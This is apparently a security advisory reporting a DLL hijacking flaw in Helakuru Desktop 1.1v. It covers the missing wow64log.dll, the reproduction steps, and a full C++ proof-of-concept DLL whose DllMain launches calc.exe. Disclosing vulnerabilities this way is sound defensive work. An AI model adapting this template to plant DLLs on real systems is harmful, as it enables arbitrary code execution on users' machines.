**DLL Hijacking Vulnerability in Helakuru**
---

**Summary**

The Helakuru Desktop version 1.1v operates on both 64-bit and 32-bit architectures. During testing, it was identified that the program attempts to load wow64log.dll, which is not included by default in modern Windows operating systems. This results in a 'Name not found' error, exposing the program to a DLL Hijacking vulnerability. By crafting a malicious wow64log.dll, arbitrary code execution can be achieved.

**Affected Version**

Helakuru Desktop 1.1v

**Steps to Reproduce**

1. Monitor DLL Loading with ProcMon
 * ProcMon showing the CreateFile operation with "Name not found" for wow64log.dll
   ![Pasted image 20240925232040](https://github.com/user-attachments/assets/e3f552d8-bb3c-4c61-87ef-8a1dd5fa9bf0)

2. Create a Malicious wow64log.dll
``` C++
#include <windows.h>
#include <stdio.h>

void LaunchCalculator()
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    const char* calcCmd = "C:\\Windows\\System32\\calc.exe";

    if (!CreateProcessA(
        NULL,          
        (LPSTR)calcCmd, 
        NULL,          
        NULL,          
        FALSE,         
        0,             
        NULL,          
        NULL,          
        &si,           
        &pi))          
    {
        printf("CreateProcess failed (%d).\n", GetLastError());
    }
    else
    {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        LaunchCalculator();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

3. Run Helakuru Desktop
 * Launch Helakuru Desktop again. The malicious wow64log.dll will now be loaded into the program, triggering the Calculator as a demonstration of successful DLL injection.
 ![Pasted image 20240925233737](https://github.com/user-attachments/assets/d01f179e-e09d-45e1-8b04-2922102f7b69)

4. Verify DLL Load using ProcMon
 * Reopen ProcMon and observe that the wow64log.dll is successfully loaded this time, confirming that the custom DLL has been executed by the program.
   ![Pasted image 20240925232728](https://github.com/user-attachments/assets/985f373f-9e7a-4d4b-b3d3-0bed98710be4)

**Impact**: This vulnerability allows for arbitrary code execution.


